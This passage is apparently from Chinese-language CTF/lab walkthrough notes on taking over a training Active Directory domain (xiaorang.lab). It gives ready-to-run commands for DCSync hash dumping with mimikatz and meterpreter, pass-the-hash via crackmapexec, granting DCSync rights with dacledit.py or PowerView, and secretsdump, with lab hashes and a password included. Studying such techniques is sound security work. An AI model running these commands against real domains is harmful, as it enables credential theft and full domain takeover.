5. DCSync 获取域管凭据

```ps1
.\mimikatz.exe "kerberos::purge" "kerberos::ptt DC01.kirbi" "lsadump::dcsync /domain:xiaorang.lab /user:administrator" "exit"  
.\mimikatz.exe "kerberos::purge" "kerberos::ptt DC01.kirbi" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"

# msf
meterpreter > load kiwi
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
```

最后 hash传递
```bash
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```


### DCSync 攻击

[DCSync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)

DCSync 攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

`whoami /all`

- Administrators 组内的用户
- Domain Admins 组内的用户
- Enterprise Admins 组内的用户
- ACL_ADMIN 组 或有 WriteDACL 权限
- 域控制器的计算机帐户
- 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。

```sh
meterpreter > load kiwi
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
# 拿到hash后 通过哈希传递 拿到域控
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

#### 添加 DCSync 权限/WriteDACL权限, 见 春秋云境——Exchange/Delivery

```sh
# 方式一
proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
# 方式二
powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIde Zhangtong -Rights DCSync -Verbose"
# 完整的 Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIdentity chenglei -Rights DCSync -Verbose

# 导出域内hash
proxychains python3 secretsdump.py xiaorang.lab/chenglei:Xt61f3LBhg1@172.22.13.6 -just-dc
```

### DC Takeover

[Ichunqiu 云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
